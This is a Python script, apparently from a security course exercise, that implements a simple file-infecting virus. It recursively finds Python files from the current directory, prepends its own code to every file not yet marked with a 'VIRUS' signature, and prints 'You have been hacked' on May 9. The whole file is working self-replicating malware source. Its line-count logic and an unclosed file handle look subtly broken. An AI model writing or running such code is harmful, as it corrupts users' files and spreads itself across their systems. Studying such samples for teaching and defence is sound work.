
#!/usr/bin/env python3
# Script Name:                  Ops Challenge: Python Malware Analysis
# Author:                       Juan Miguel Cano
# Date of latest revision:      12/14/2023
# Purpose:                      This script is to demonstrate the basic functionality of a computer virus written in Python.        
# Execution:                    31Ops14.py
# Resources:                    https://chat.openai.com/share/bb83b687-6966-44b4-921a-0e722af0cfd2


#!/usr/bin/python3
import os
import datetime

SIGNATURE = "VIRUS"  # Signature string to mark infected files

# This function searches for and lists Python files that are not yet infected.
def locate(path):
    files_targeted = []
    filelist = os.listdir(path)  # List all files in the current directory
    for fname in filelist:
        # Recursively call locate function for directories
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        # Check if file is a Python file and not infected
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

# This function infects uninfected Python files by prepending them with the virus's code.
def infect(files_targeted):
    virus = open(os.path.abspath(__file__))  # Open the current file (virus)
    virusstring = ""
    # Read the first 39 lines of the virus (the virus's own code)
    for i, line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()  # Read the original file
        f.close()
        f = open(fname, "w")
        f.write(virusstring + temp)  # Write the virus's code followed by the original code
        f.close()

# This function defines a payload that triggers on a specific date.
def detonate():
    # Trigger on May 9th
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

# Main script execution starts here
files_targeted = locate(os.path.abspath(""))  # Locate target files starting from the current directory
infect(files_targeted)  # Infect the located files
detonate()  # Check if it's the payload trigger date and execute the payload if so






